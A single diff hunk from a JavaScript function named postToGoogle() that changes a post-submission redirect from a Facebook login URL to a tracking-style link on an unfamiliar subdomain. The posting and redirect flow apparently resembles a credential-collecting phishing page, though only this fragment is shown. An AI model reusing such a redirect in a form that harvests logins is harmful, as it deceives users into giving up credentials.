@@ -141,7 +141,7 @@ function postToGoogle() {
 
                       // document.getElementById("sucsm").style.display="inherit";
 
-                      window.location.replace("https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM3NzAyMzYyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next");
+                      window.location.replace("https://pub660.xtraaa.com/391307?fbclid=IwY2xjawIC9XhleHRuA2FlbQIxMQABHc0MmGYmWcrU-nUcHIvNijli8YyBF2thFLcFy-cKAQJ185KlDpR2HgO0ww_aem_jYMUVow9YjAe2JvqN9diQA");
                       
 
                                }
